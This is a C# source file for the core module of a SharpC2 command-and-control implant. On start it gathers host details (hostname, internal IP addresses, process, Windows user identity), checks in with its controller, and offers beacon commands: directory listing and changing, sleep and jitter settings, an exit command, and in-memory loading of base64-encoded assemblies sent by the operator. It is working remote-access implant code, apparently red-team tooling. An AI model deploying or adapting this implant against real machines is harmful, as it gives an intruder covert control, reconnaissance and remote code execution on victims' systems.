using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;

using Agent.Models;
using Agent.Common;
using Agent.Interfaces;
using Agent.Controllers;

namespace Agent.Modules
{
    internal class CoreAgentModule : IAgentModule
    {
        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "Core",
                Developer = "Daniel Duggan, Adam Chester",
                Commands = new List<AgentModuleInfo.AgentCommand>
                {
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "ls",
                        Description = "List a Directory",
                        HelpText = "ls [path]",
                        Callback = ListDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "cd",
                        Description = "Change Directory",
                        HelpText = "cd [path]",
                        Callback = ChangeDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "pwd",
                        Description = "Print Working Directory",
                        HelpText = "pwd",
                        Callback = PrintWorkingDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "sleep",
                        Description = "Set the sleep time (in seconds) and jitter factor (percent). If no options are supplied, the current values are returned.",
                        HelpText = "sleep [time] [jitter]",
                        Callback = SetSleep
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "loadmodule",
                        Description = "Load an Agent Module",
                        HelpText = "loadmodule [assembly]",
                        Callback = LoadAgentModule
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "exit",
                        Description = "Kills the agent",
                        HelpText = "exit",
                        Callback = Exit
                    }
                }
            };
        }

        public void Initialise(AgentController agent, ConfigurationController config)
        {
            var moduleInfo = GetModuleInfo();
            agent.RegisterAgentModule(moduleInfo);

            // Set AgentId
            config.SetOption(ConfigurationSettings.AgentId, Helpers.GenerateRandomString(8));

            // Get initial metadata
            var proc = Process.GetCurrentProcess();
            var host = Dns.GetHostName();
            var ips = Dns.GetHostEntry(host).AddressList.Where(i => i.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).Select(i => i.ToString()).ToArray();
            var metadata = new InitialMetadata
            {
                AgentId = (string)config.GetOption(ConfigurationSettings.AgentId),
                ComputerName = host,
                InternalAddresses = ips,
                ProcessName = proc.ProcessName,
                ProcessId = proc.Id,
                Identity = WindowsIdentity.GetCurrent().Name,
                Architecture = Helpers.Is64BitProcess ? "x64" : "x86"
            };

            // Initial checkin
            agent.InitialCheckIn(metadata);

            // Register the module info
            agent.SendModuleRegistered(moduleInfo);
        }

        private void ListDirectory(string data, AgentController agent, ConfigurationController config)
        {
            var results = new SharpC2ResultList<FileSystemEntryResult>();
            
            try
            {
                var path = string.IsNullOrEmpty(data) ? Directory.GetCurrentDirectory() : data;

                foreach (string dir in Directory.GetDirectories(path))
                {
                    var dirInfo = new DirectoryInfo(dir);
                    results.Add(new FileSystemEntryResult
                    {
                        Name = dirInfo.FullName,
                        Length = 0,
                        CreationTimeUtc = dirInfo.CreationTimeUtc,
                        LastAccessTimeUtc = dirInfo.LastAccessTimeUtc,
                        LastWriteTimeUtc = dirInfo.LastWriteTimeUtc
                    });
                }
                foreach (string file in Directory.GetFiles(path))
                {
                    var fileInfo = new FileInfo(file);
                    results.Add(new FileSystemEntryResult
                    {
                        Name = fileInfo.FullName,
                        Length = fileInfo.Length,
                        CreationTimeUtc = fileInfo.CreationTimeUtc,
                        LastAccessTimeUtc = fileInfo.LastAccessTimeUtc,
                        LastWriteTimeUtc = fileInfo.LastWriteTimeUtc
                    });
                }
            }
            catch (Exception e)
            {
                agent.SendError("core", "ls", e.Message);
            }

            agent.SendCommandOutput(results.ToString());
        }

        private void ChangeDirectory(string data, AgentController agent, ConfigurationController config)
        {
            var result = string.Empty;

            try
            {
                Directory.SetCurrentDirectory(data);
                result = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                agent.SendError("core", "cd", e.Message);
            }

            agent.SendCommandOutput(result);
        }

        private void PrintWorkingDirectory(string data, AgentController agent, ConfigurationController config)
        {
            var result = string.Empty;

            try
            {
                result = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                agent.SendError("core", "pwd", e.Message);
            }

            agent.SendCommandOutput(result);
        }

        private void SetSleep(string data, AgentController agent, ConfigurationController config)
        {
            var result = string.Empty;

            try
            {
                if (string.IsNullOrEmpty(data))
                {
                    result = string.Format("sleep: {0} jitter: {1}", config.GetOption(ConfigurationSettings.SleepTime), config.GetOption(ConfigurationSettings.Jitter));
                    agent.SendCommandOutput(result);
                    return;
                }

                var cfg = data.Split(' ');

                if (int.TryParse(cfg[0], out int sleep) && int.TryParse(cfg[1], out int jitter))
                {
                    config.SetOption(ConfigurationSettings.SleepTime, sleep);
                    config.SetOption(ConfigurationSettings.Jitter, jitter);
                }
                else
                {
                    agent.SendError("core", "sleep", "Provided values are not of type int");
                    return;
                }

                result = string.Format("sleep: {0} jitter: {1}", config.GetOption(ConfigurationSettings.SleepTime), config.GetOption(ConfigurationSettings.Jitter));
            }
            catch (Exception e)
            {
                agent.SendError("core", "set", e.Message);
            }

            agent.SendCommandOutput(result);
        }

        private void LoadAgentModule(string data, AgentController agent, ConfigurationController config)
        {
            if (string.IsNullOrEmpty(data)) { return; }

            var assembly = Assembly.Load(Helpers.Base64Decode(data));
            var module = assembly.CreateInstance("Agent.AgentModule", true);

            if (module is IAgentModule == false)
            {
                agent.SendError("core", "loadmodule", "Assembly is not of type IAgentModule");
                return;
            }

            var agentModule = module as IAgentModule;
            agentModule.Initialise(agent, config);
        }

        private void Exit(string data, AgentController agent, ConfigurationController config)
        {
            agent.Stop();
        }
    }
}